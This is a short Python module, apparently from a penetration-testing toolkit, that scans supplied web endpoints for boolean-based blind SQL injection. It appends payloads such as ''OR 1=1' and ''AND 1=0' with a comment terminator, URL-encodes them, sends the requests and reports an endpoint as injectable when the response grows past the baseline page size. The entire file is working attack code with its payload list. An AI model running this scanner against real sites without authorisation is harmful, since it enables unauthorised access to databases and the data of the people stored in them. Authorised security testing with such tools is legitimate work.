import requests

from utils.auxiliary import *

payloads = [
    "'OR 1=0",
    "'OR 1=1",
    "'AND 1=0",
    "'AND 1=1",
]


def try_boolean_sqli(url, options: list):
    l = Auxiliary(__name__)
    l.set_config()
    vuln_endpoints = options[0]
    db_comment = options[1]
    init_r = requests.get(url=url)
    for endp in vuln_endpoints:
        for pld in payloads:
            # URL encoding our payload
            pld = requests.utils.quote(pld + db_comment)
            r = requests.get(url=url + endp + pld)
            l.logger.info(
                f"[*] Trying blind SQLi on endpoint {url + endp + pld}")
            if r.status_code == 200:
                # If new page size is bigger, we have found additional content
                if len(r.text) > len(init_r.text):
                    l.logger.info(
                        f"[+] Confirmed blind SQLi on endpoint {url + endp + pld}")
                    l.logger.info(
                        f"[+] New page size is {len(r.text)} instead of default {len(init_r.text)}")
                    return endp
